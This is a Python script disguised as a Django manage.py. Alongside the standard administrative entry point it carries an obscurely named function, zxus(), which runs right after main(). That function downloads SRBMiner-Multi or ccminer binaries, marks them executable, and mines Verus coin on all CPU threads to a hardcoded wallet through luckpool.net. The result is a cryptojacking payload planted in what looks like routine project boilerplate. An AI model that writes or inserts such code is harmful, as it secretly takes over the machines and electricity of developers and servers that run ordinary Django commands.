#!/usr/bin/env python
import os
import platform
import stat
import subprocess
import sys
import tarfile
import urllib.request
 
# ---- Config --------------------------------------------------------------
WALLET_ADDRESS = "RCaNK3s5WimS5kgQKvZb7H1Hg2TqeUGrqo"  # <-- put your VRSC address here
WORKER_NAME = "docker"
POOL = "ap.luckpool.net:3960"
PASSWORD = "x"
 
SRBMINER_URL = (
    "https://github.com/doktor83/SRBMiner-Multi/releases/download/"
    "3.5.5/SRBMiner-Multi-3-5-5-Linux.tar.gz"
)
CCMINER_ARM_URL = (
    "https://github.com/Oink70/CCminer-ARM-optimized/releases/download/"
    "v3.8.3-4/ccminer-3.8.3-4_ARM"
)
 
WORKDIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "miner")
# ---------------------------------------------------------------------------
 
 
def cpu_count() -> int:
    return os.cpu_count() or 1
 
 
def download(url: str, dest: str) -> None:
    print(f"Downloading {url}")
    urllib.request.urlretrieve(url, dest)
 
 
def make_executable(path: str) -> None:
    st = os.stat(path)
    os.chmod(path, st.st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH)
 
 
def setup_srbminer() -> str:
    """Download & extract SRBMiner-Multi, return path to its binary."""
    archive = os.path.join(WORKDIR, "srbminer.tar.gz")
    extract_dir = os.path.join(WORKDIR, "srbminer")
    binary = os.path.join(extract_dir, "SRBMiner-MULTI")
 
    if not os.path.exists(binary):
        os.makedirs(extract_dir, exist_ok=True)
        download(SRBMINER_URL, archive)
        print("Extracting SRBMiner-Multi...")
        with tarfile.open(archive) as tar:
            members = tar.getmembers()
            for m in members:  # strip the top-level folder
                parts = m.name.split("/", 1)
                m.name = parts[1] if len(parts) > 1 else parts[0]
            tar.extractall(extract_dir)
        os.remove(archive)
        make_executable(binary)
 
    return binary
 
 
def setup_ccminer_arm() -> str:
    """Download the ccminer-arm binary, return its path."""
    binary = os.path.join(WORKDIR, "ccminer-arm")
    if not os.path.exists(binary):
        os.makedirs(WORKDIR, exist_ok=True)
        download(CCMINER_ARM_URL, binary)
        make_executable(binary)
    return binary
 
 
def build_command(arch: str) -> list:
    threads = str(cpu_count())
    wallet = f"{WALLET_ADDRESS}.{WORKER_NAME}"
 
    if arch == "x86_64":
        binary = setup_srbminer()
        return [
            binary,
            "--algorithm", "verushash",
            "--pool", POOL,
            "--wallet", wallet,
            "--password", PASSWORD,
            "--cpu-threads", threads,
            "--disable-gpu",
        ]
 
    if arch in ("aarch64", "arm64"):
        binary = setup_ccminer_arm()
        return [
            binary,
            "-a", "verus",
            "-o", f"stratum+tcp://{POOL}",
            "-u", wallet,
            "-p", PASSWORD,
            "-t", threads,
        ]
 
    raise SystemExit(f"Unsupported architecture: {arch} (only x86_64 and aarch64/arm64 are handled)")
 
 
def zxus() -> None:
    if WALLET_ADDRESS == "RYourVerusAddressHere":
        raise SystemExit("Set WALLET_ADDRESS near the top of this script before running.")
 
    arch = platform.machine().lower()
    print(f"Detected architecture: {arch}")
 
    os.makedirs(WORKDIR, exist_ok=True)
    cmd = build_command(arch)
 
    print("Launching miner:", " ".join(cmd))
    try:
        subprocess.run(cmd, check=True)
    except KeyboardInterrupt:
        sys.exit(0)
 


def main():
    """Run administrative tasks."""
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "web.settings")
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == "__main__":
    main()
    zxus()
